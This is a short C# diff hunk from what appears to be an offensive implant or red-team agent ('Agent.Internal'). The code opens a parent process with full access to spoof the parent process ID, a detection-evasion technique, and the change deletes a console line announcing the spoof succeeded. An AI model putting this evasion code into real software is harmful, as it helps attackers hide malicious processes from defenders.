@@ -25,7 +25,6 @@ namespace Agent.Internal
             IntPtr parentHandle = Native.Kernel32.OpenProcess(0x001F0FFF, false, ppid);
             if (parentHandle == IntPtr.Zero)
                 return IntPtr.Zero;
-            Console.WriteLine(":: Successfully spoofed ppid :::");
             IntPtr lpValue = IntPtr.Zero;
             lpValue = Marshal.AllocHGlobal(IntPtr.Size);
             Marshal.WriteIntPtr(lpValue, parentHandle);
